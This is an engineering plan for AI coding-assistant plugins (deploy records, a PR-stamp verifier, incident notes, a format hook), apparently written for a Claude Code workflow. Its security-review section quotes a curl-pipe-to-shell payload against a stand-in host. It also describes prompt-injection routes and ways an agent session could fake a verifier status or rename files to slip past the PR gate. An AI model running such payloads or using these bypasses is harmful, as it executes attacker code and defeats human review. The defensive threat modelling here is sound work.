# Plan: carry the loop past the build

Built from `spec.md` and `intent.md` in this folder.
Status: implemented.
Approver: the maintainer; the format hook and the verifier rule touch gates, so a security-architect challenge of this plan runs before the build (see Security challenge).
Dated: 2026-11-01.

## Interfaces every part builds against

These are fixed here so the parts can be built in parallel.
The record fields are in `docs/loop-records.md` and are not repeated here.

`plugins/pro-ai-sdlc/scripts/evidence.py`, written in step 0 before the parts start, standard library only:

- `repo_root(cwd=None) -> str | None`, `rev(root, ref) -> str | None`, `ensure_excluded(root)` (adds `.pro-dev/` to `info/exclude`), `write_atomic(path, text)`.
- `plugin_version() -> str`, read from pro-ai-sdlc's `.claude-plugin/plugin.json`.
- `safe_key(text) -> bool`: only `a-z`, `0-9` and `-`, not starting with `-`.
- `mieruka_copy(root, key, text) -> (path | None, why)`: the rule of `ship.py`'s function of the same name, byte for byte in behaviour.
- `write_record(root, subdir, record) -> {"path", "mieruka", "why"}`: checks `safe_key(record["evidence_key"])`, checks `detail_json` is a string and `kind` and `status` are in mieruka's lists, writes `.pro-dev/<subdir>/<evidence_key>.json` and then the mieruka drop.
- `KINDS = ("review", "qa_run", "deploy", "a11y", "visual_drift", "doc")` and `STATUSES = ("pass", "fail", "partial", "info")`.
- `class Refuse(Exception)` for a refusal printed to stderr with exit 1.

Every new script prints one JSON object on success, `{"path": ..., "mieruka": ... | null, "why": ...}` plus its own keys and exits 0; a refusal goes to stderr with exit 1; usage errors exit 2.

`ship.py deployed` (part A) prints the same shape and adds `"status"` and `"evidence_key"`.

`pr-check.py stamp --reviewers` (part B) accepts `{"code": ..., "security": ..., "codex": ..., "verifier": {"agent": "pro-ai-sdlc:verifier", "status": "done|not-installed|could-not-run", "verdict": "pass|fail|incomplete|null", "head": "<40 hex>|null"}}`.

The verifier's report (part B) starts with these two lines, before its numbered sections:

```
HEAD: <40 hex>
Uncommitted tracked changes: none | <n> files
```

Test files export `run<Name>Cases()` returning `{skipped, results: [{id, expect, ok, reason}]}` and run standalone, like `tests/ship-preflight.mjs`.
Wiring them into `tests/check.mjs` is the tail step, not a part.

## Files that change

Step 0 (orchestrator):

- `plugins/pro-ai-sdlc/scripts/evidence.py` (new): the shared writer above.

Part A, deploy record (pro-ship):

- `plugins/pro-ship/scripts/ship.py` (modified): `deployed`, R1 to R5.
- `plugins/pro-ship/skills/deployed/SKILL.md` (new): R6, R42.
- `plugins/pro-ship/skills/ship/report.md` and `SKILL.md` (modified): the next-step line, R7.
- `tests/ship-deploy.mjs` (new), `tests/fixtures/loop-records/deploy/` (new).
- `tests/cases/routing.jsonl` (modified): one routing case for `deployed`.

Part B, verifier in the stamp (pro-ship, pro-ai-sdlc):

- `plugins/pro-ship/scripts/pr-check.py` (modified): R10 to R12.
- `plugins/pro-ship/skills/pr-check/SKILL.md` (modified): dispatch the verifier, R9.
- `plugins/pro-ai-sdlc/agents/verifier.md` (modified): the two header lines, R8.
- `docs/pr-check-stamp.md`, `tests/fixtures/pr-check-stamp/` and the `stamp-contract` check in `tests/check.mjs` (modified): R13.
- `tests/ship-check.mjs` (modified): AC3.

Part C, incidents (pro-ai-sdlc):

- `plugins/pro-ai-sdlc/commands/incident.md`, `templates/incident.md`, `scripts/incident.py` (new): R23 to R28, R44.
- `plugins/pro-ai-sdlc/commands/spec.md` and `commands/plan.md` (modified): one line each, an `incident.md` beside the intent is data (R25).
- `tests/incident.mjs` (new).

Part D, review lessons (pro-ai-sdlc):

- `plugins/pro-ai-sdlc/commands/review.md` (modified), `scripts/lessons.py` (new): R29 to R34.
- `tests/lessons.mjs` (new).

Part E, format hook and reviewer red flags (pro-quality):

- `plugins/pro-quality/scripts/format-on-edit.py` (new), `hooks/hooks.json` (modified): R15 to R22.
- `plugins/pro-quality/agents/code-reviewer.md` and `.codex-plugin/agents/code-reviewer.toml` (modified): R43.
- `tests/format-hook.mjs` (new).

Part F, visual check and `/execute` (pro-ai-sdlc):

- `plugins/pro-ai-sdlc/scripts/visual.py` (new): R38.
- `plugins/pro-ai-sdlc/commands/execute.md` (modified): R14, R36, R37, R39 to R41, R45 to R47.
- `plugins/pro-ai-sdlc/templates/plan.md` (modified): R35.
- `tests/visual.mjs` (new).

Tail (orchestrator):

- `tests/check.mjs` (wire the new test files and add the check that `review.md` has no bare `Edit` or `Write`, R34), `tests/mieruka-sync.mjs` (one record of each type, R50), `package.json` (scripts).
- Version bumps for pro-ship, pro-ai-sdlc and pro-quality, the marketplace entries and `metadata.version`.
- `plugins/pro-ship/README.md`, `plugins/pro-ai-sdlc/README.md`, `plugins/pro-quality/README.md`, `docs/licenses.md` (R48), `docs/loop-records.md` (status line), `docs/roadmap.md`, `ARCHITECTURE.md` if its gates or hooks rows change.

## Order of work

0. Write `evidence.py` and a smoke test of `write_record` in a throwaway repo (S; R49).
   Checkpoint: a record lands in `.pro-dev/` and in an ignored `.mieruka/evidence/`; an unsafe key is refused.
1. Parts A to F in parallel, each in its own worktree off the build branch, by Sonnet builders with a shared brief (M each).
   Checkpoint per part: its own test file passes and `node tests/check.mjs` passes or fails only on a check another part owns.
2. Merge the six branches into the build branch in the order B, A, E, C, D, F (B first because it touches `tests/check.mjs`).
   Checkpoint: no conflicts outside `tests/check.mjs`; every part's tests still pass.
3. Tail: wire tests, extend `tests/mieruka-sync.mjs`, bump versions, update the READMEs, licenses and roadmap (S).
   Checkpoint: the four commands in `CLAUDE.md`'s "Verifying your work" pass; `MIERUKA_ROOT=../mieruka/mieruka node tests/mieruka-sync.mjs` passes.
4. Review: `pro-ai-sdlc:reviewer` and `pro-security:security-architect` in diff mode, in one turn, on the build branch against main (M).
   Checkpoint: every Important finding fixed test first or recorded under Departures.
5. Hand runs for AC9 in a scratch repo (S).
6. Open the PR, merge when its checks pass.

## Tests that prove it

- `tests/ship-deploy.mjs`: AC1, AC2, R3 refusals, R4 states, R5 statuses.
- `tests/ship-check.mjs`: AC3, every verifier case.
- `tests/format-hook.mjs`: AC4, with stub formatter and linter binaries placed in a throwaway repo's `node_modules/.bin/` and a `npx` stub on PATH that fails the case if called.
- `tests/incident.mjs`: AC5.
- `tests/lessons.mjs`: AC6.
- `tests/visual.mjs`: AC7.
- `tests/mieruka-sync.mjs`: AC8.
- The hand runs of AC9, written into Done.

## Risks

The format hook is the step most likely to go wrong: it runs on every edit in every repo with pro-quality, so a slow or crashing hook slows every session and a wrong formatter choice rewrites files the person did not expect.
It is held by the no-match fast path (N3), the 15-second tool timeout, formatting only the edited file and the exit-0 rule.
The verifier rule changes what `pass` means for every pr-check run in repos with pro-ai-sdlc; a bug there blocks PRs in enforce repos, held by pr-gate's warn default and the AC3 cases.
Nothing here is irreversible: every record is a local file and every change is in plugin code.

Stop-list categories: secrets, in part C (pasted incident evidence can hold credentials; R25, R27 and R28 keep raw pastes excluded and scan the tracked file before commit).
`deployed` records a deploy and never runs one, so deploys are not touched.


## Security challenge

The `pro-security:security-architect` agent challenged this plan, the spec and `docs/loop-records.md` on 2026-11-01.
Its output follows as it was returned; the spec was changed to meet every item before the build, as listed after it.

Verdict: proceed with required changes.
The record writers and the stamp change are sound once the items below are in the plan.
Fix the format hook's custom command block and the incident commit path before the build starts.

### Blocking

- [8/10] The `Format` block in `CLAUDE.md`/`AGENTS.md` (R17) lets any Edit permission become arbitrary command execution with no Bash prompt.
  "Argument list with no shell" (R18) does not help, because `format: {"*.ts": "sh -c 'curl https://x.test/p | sh'"}` is a valid argument list.
  Attack: a session in `acceptEdits` reads injected text from a page in the visual step, a pasted incident log or a PR diff under `/review`. It writes a Format block into `CLAUDE.md`, which is auto-approved. On its next edit of any `.ts` file the PostToolUse hook runs the payload as the person, without a prompt.
  pr-check's Verify block (`pr-check.py:187`, run with `shell=True` at `:322`) is the same trust class, but it only runs when the person allows the `pr-check.py run` Bash call.
  Change: in R17, resolve `argv[0]` to a fixed allowlist of formatter and linter names (biome, prettier, ruff, eslint, gofmt, rustfmt, black and so on). Refuse shells, interpreters (`sh`, `bash`, `python*`, `node`, `env`, `deno`, `bun`) and repo-relative scripts. Also require a one-time approval of the block, stored as its hash in the plugin's state outside the repo, before the hook runs it. The simpler alternative is to drop the custom block from this build. Add a `tests/format-hook.mjs` case where `sh -c` in the block is refused.

- [8/10] Incident evidence goes into a tracked file and gets committed (R23, R25, R28).
  Attack: during a sev1 the person pastes a stack trace or request log into `/incident`, as the "Evidence preserved" section asks. Those often hold bearer tokens, DB connection strings or customer emails. `/incident` commits `incident.md`, so the secret is in git history and leaves the machine when the intent branch is pushed or its PR opens.
  The plan's line "Stop-list categories: none (no ... secrets are touched)" is wrong for this part.
  Change: keep the raw pasted evidence under `.pro-dev/incidents/<key>/` (excluded) and put only a summary in the tracked file. Before `/incident` commits, `incident.py` should scan `incident.md` with REVIEW.md's credential patterns (or the `REDACT` list pr-check already has) and refuse on a match. Correct the stop-list line. Add an AC5 case where a pasted `ghp_` token is refused.

### Required changes

- [7/10] The auto-detected tools (R17) run repo-supplied code on every edit, including in a repo the person only cloned.
  Attack: a stranger's repo commits an executable `node_modules/.bin/prettier` plus a `.prettierrc`. The person asks Claude to fix a typo and the hook runs it. A `prettier.config.js`, `eslint.config.js` or Prettier `plugins` entry runs repo JavaScript the same way.
  Change: refuse any tool path that git tracks (`git ls-files --error-unmatch`). Require the tool's realpath to be inside the repo's untracked `node_modules/` or `.venv/`, or in an absolute PATH entry; drop relative PATH entries. Pass the file as an absolute path (plus `--` where the tool supports it) so a name like `--plugin=x.mjs` cannot become an option. The pro-quality README should state that the hook runs the repo's formatter config on every edit.

- [7/10] The stamp accepts a `verifier.status` of `not-installed` that the session supplies, and that value passes (R12). This is cheaper to fake than a hand-written stamp because it goes through the normal command.
  Attack: a session with a failing verifier calls `stamp --reviewers '{..."verifier":{"status":"not-installed"}}'`, gets `pass`, and pr-gate lets `gh pr create` through.
  Change: `pr-check.py stamp` runs `find_sibling(root, "pro-ai-sdlc", "agents/verifier.md")` itself. It refuses `not-installed` when that finds the file and requires `agent == "pro-ai-sdlc:verifier"`. Validate `head` as 40 lowercase hex before it reaches any git call. Add both cases to AC3.

- [7/10] The `intent/`-only exemption in R11 can be met by a rename.
  Attack: after the verifier passes, the session moves `src/middleware/auth.ts` to `intent/x/auth.ts`. With rename detection, `git diff --name-only <head> HEAD` lists only `intent/x/auth.ts`, so the old pass still counts while the auth file has left the build.
  Change: compute the changed set with `git diff --name-status --no-renames`. Every path, deleted side included, must start with the top-level `intent/`. Refuse symlinks, mode changes and submodule entries in that set. Add a rename case to AC3.

- [7/10] `/review` reads untrusted PR diffs (`gh pr diff`), and R34 gives it "the edit of the agent file". If the builder writes a bare `Edit`, an injected diff gets an edit tool with no prompt that reaches every file.
  Change: R34 should name exactly `Edit(CLAUDE.md)`, `Edit(AGENTS.md)` and `Bash(python3 "${CLAUDE_PLUGIN_ROOT}/scripts/lessons.py":*)`, following the path-scoped pattern `plugins/pro-egm/commands/goldfish.md:4` already uses. Add a check in `tests/check.mjs` that refuses a bare `Edit` or `Write` in `review.md`.

- [6/10] (verify) Text from the reviewed PR reaches the shell and then every future session's instructions.
  Attack: a contributor's PR contains code that shapes the finding's claim. `/review` builds `lessons.py add --claim "<text>"` with `$(...)` in it, and on a second PR it proposes an agent-file line the person approves after a quick skim.
  Change: pass `--claim` and `--line` through a file or stdin, not argv. `lessons.py mark` should refuse a line with a newline, a code fence or more than about 200 characters. Show the exact line before asking yes or no.

- [6/10] (verify) "Fenced as data" in R25 breaks when the pasted text contains a fence of its own. A tracked `incident.md` is then read as instructions by `/spec`, `/plan` and every later session that opens the intent folder.
  Change: wrap each paste in a fence longer than its longest run of backticks or tildes. Have `/spec` and `/plan` treat `incident.md` as data, the same way R25 does.

- [6/10] (verify) `visual.py record --shot <png>` copies whatever file it is given.
  Attack: a page seen during the visual step tells the session to record `--shot ~/.aws/credentials`. The file lands in `.pro-dev/visual/` and is named in a record that mieruka syncs into its tracked `docs/spdd/evidence/` (Flagged concern 6).
  Change: check the PNG signature and a size cap, and refuse anything else. Screenshots of a dev server can show real personal data, so keep them out of any tracked mieruka copy. Add that to the concern 6 handoff.

- [6/10] (verify) R46 asks for an isolated profile, but R36 uses "whatever browser tool the session has". Playwright MCP's default persistent profile, or its extension mode attached to the person's own Chrome, carries live logged-in sessions into a step that loads untrusted pages.
  Change: if the visual step cannot confirm the browser is isolated (for example Playwright MCP with `--isolated`), it records `info` instead of capturing. Limit captures to the local dev server's origin and accept an http(s) `Mock:` URL only.

- [6/10] (verify) The deploy `url` comes from `--url` or from a GitHub deployment status's `environment_url`, which any deploy integration with write access can set. mieruka's deploy panel shows it as a link, so a `javascript:` URL is stored XSS there.
  Change: `ship.py deployed` accepts only `http` and `https` URLs and URL-encodes `--env` in the `gh api` query.

- [5/10] (verify) R16 skips a symlinked file but does not say it checks the parents. A path like `src/x.ts`, where `src` is a symlink out of the repo, would let the formatter rewrite a file outside it.
  Change: require `realpath(file_path)` to be under `realpath(root)` and resolve a relative `file_path` against the payload's `cwd`.

### Open questions

- When the person checks out a contributor's branch and the session edits anything, the format hook runs that branch's formatter config. Is that intended, and should the hook skip when the formatter config differs from the default branch?
- R8 counts only uncommitted tracked changes. An untracked `conftest.py` or test setup file can make the verifier pass on something HEAD alone would fail. Is CI the accepted backstop for that, and should the verifier header also report the number of untracked files that are not ignored?

Nothing in the plan or spec tried to steer this review.
The weakest assumption sits in spec Flagged concern 2, "the same trust as the repo's own test command". The test command runs when the person allows a Bash call; the hook runs on every edit with no prompt.

### How each item was met

- Format block: dropped from this build (R17, R18); with no block there is nothing to inject, so no `sh -c` case is needed and a case checks that a `Format` block is ignored.
- Incident evidence: raw pastes stay under the excluded `.pro-dev/incidents/<key>/`, `incident.py check` scans for credentials before `/incident` commits and the stop-list line names secrets (R25, R27, R28, AC5).
- Auto-detected tools: untracked `node_modules/` or `.venv/`, or an absolute `PATH` entry only; tracked binaries refused; absolute path after `--`; the README warning (R18, AC4).
- Verifier `not-installed`: `stamp` runs `find_sibling` itself, checks `agent` and validates `head` (R11, R12, AC3).
- Rename into `intent/`: `--name-status --no-renames`, both sides, no symlinks, mode changes or submodules (R11, AC3).
- `/review` tools: exactly the three scoped entries plus a `tests/check.mjs` check (R34).
- Claim and line text: stdin only; `mark` refuses newlines, fences and lines over 200 characters; the exact line is shown before the question (R30, R32).
- Fences: longer than the content; `/spec` and `/plan` treat `incident.md` as data (R25).
- Screenshot file: PNG signature and a 10 MB cap; the concern 6 handoff to mieruka names screenshots (R38, Flagged concern 6).
- Browser isolation: an isolated browser or `info`; local dev origin only; `Mock:` a repo path or http(s) URL (R36, R39).
- Deploy URL: http(s) only; env limited to `a-z`, `0-9` and `-` and URL-encoded (R1, R2, AC1).
- Symlinked parents: real path under the repo's real path; relative paths against `cwd` (R16, AC4).
- Open question 1: accepted and stated in the README; skipping when the config differs from the default branch is left out because a repo's own formatter changes on branches too.
- Open question 2: the verifier header reports untracked files that are not ignored and CI stays the backstop (R8).

## Options not taken

- One builder for all of pro-ai-sdlc: C, D and F touch separate files, so they run in parallel once `evidence.py` exists.
- Each part as its own PR: the version bumps and `tests/check.mjs` wiring would conflict six times; one build PR, as for ship-preflight.

## Proof of done

```bash
node tests/check.mjs && node tests/eval.mjs --dry
node tests/route-lexical.mjs --min-rank1 70 && node --test tests/unit/*.test.mjs
claude plugin validate . --strict
( for p in plugins/*/; do claude plugin validate "${p%/}" --strict || exit 1; done )
MIERUKA_ROOT=../mieruka/mieruka node tests/mieruka-sync.mjs
```

All pass, with the new test files counted inside `tests/check.mjs`.

## Done

- Build commit: 137f054
- Checks run:
  - `node tests/check.mjs`: 45 checks, 0 failures, 13 warnings.
  - `node tests/eval.mjs --dry`: 99 cases reference real skills.
  - `node tests/route-lexical.mjs --min-rank1 70`: rank-1 80/98 (81.6%).
  - `node --test tests/unit/*.test.mjs`: 167 pass, 0 fail.
  - `claude plugin validate . --strict` and every plugin strict: all pass.
  - `MIERUKA_ROOT=../mieruka/mieruka node tests/mieruka-sync.mjs`: the preflight, deploy, incident, review-lesson and ui-step records all load with mieruka's own sync.
  - Per suite: ship-deploy 60/60, ship-check 229/229, format-hook 51/51, incident 39/39, lessons 39/39, visual 31/31, execute 28/28.
- Reviews: `pro-ai-sdlc:reviewer` (4 Important, 3 nits) and two `pro-security:security-architect` diff passes (one high, then one medium); every Important and every security finding was fixed, test first where a test could show it, and is listed under Departures.
- Definition of done: met except AC9 (pro-ai-sdlc references/definition-of-done.md).
- Doubt: none; no step was hard to undo.
- AC1: pass, `tests/ship-deploy.mjs` (record fields, preflight `missing`, a `javascript:` URL refused).
- AC2: pass, `tests/ship-deploy.mjs` with a stubbed `gh`.
- AC3: pass, `tests/ship-check.mjs` (every verifier case, including the rename into `intent/`, a disabled install and the committed-settings rule).
- AC4: pass, `tests/format-hook.mjs` (Prettier and ESLint behind the opt-in, untracked and TypeScript configs refused, tracked binaries refused, no `npx`).
- AC5: pass, `tests/incident.mjs` (each state, a `ghp_` token and twelve other credential shapes refused in `incident.md` and `intent.md`).
- AC6: pass, `tests/lessons.mjs`.
- AC7: pass, `tests/visual.mjs`.
- AC8: pass, `tests/mieruka-sync.mjs` against the mieruka checkout.
- AC9: not run. The hand runs of `/incident`, `/review` with a repeat, `/pro-ship:deployed` and `/execute` with a mock need a session on the released plugins; they are left for the first real use and noted in the PR.
- AC10: pass, the commands above.
- Sign-off: approved by the maintainer on 2026-11-01; AC9's hand runs stay open for the first real use.

The sign-off moves `status` in the intent and the spec to `accepted`.
It also moves ADR-0023 from `proposed` to `accepted`.

## Departures from plan

- The security diff review found that Prettier and ESLint configs are code the tool runs, so a session could turn an auto-approved edit into code execution; Prettier and ESLint became an opt-in kept outside the repo (R17, R18).
- `tests/fixtures/loop-records/` was not created: each record test builds its inputs in a throwaway repo, so no shared fixtures were needed.
- `incident.py` gained `prepare`, which excludes the evidence folder before any paste is saved and `/incident` runs `record` before the commit so a bad frontmatter value is caught first (review follow-ups).
- `incident.py check` scans `intent.md` as well as `incident.md`, because both are committed (review follow-up).
- `/review` pre-approves no agent-file edit: the person sees the exact line in the permission prompt (security diff review) and `--ref` is always the branch name so a branch and its PR count as one change.
- `/incident` scopes its `Write` to `intent/**` and `.pro-dev/incidents/**` and its `git config` to `user.name`, because it reads pasted text.
- pr-check refuses a `not-installed` verifier only when pro-ai-sdlc is installed and enabled for the repo, not when its files merely exist (review follow-up).


## Noticed but not touched
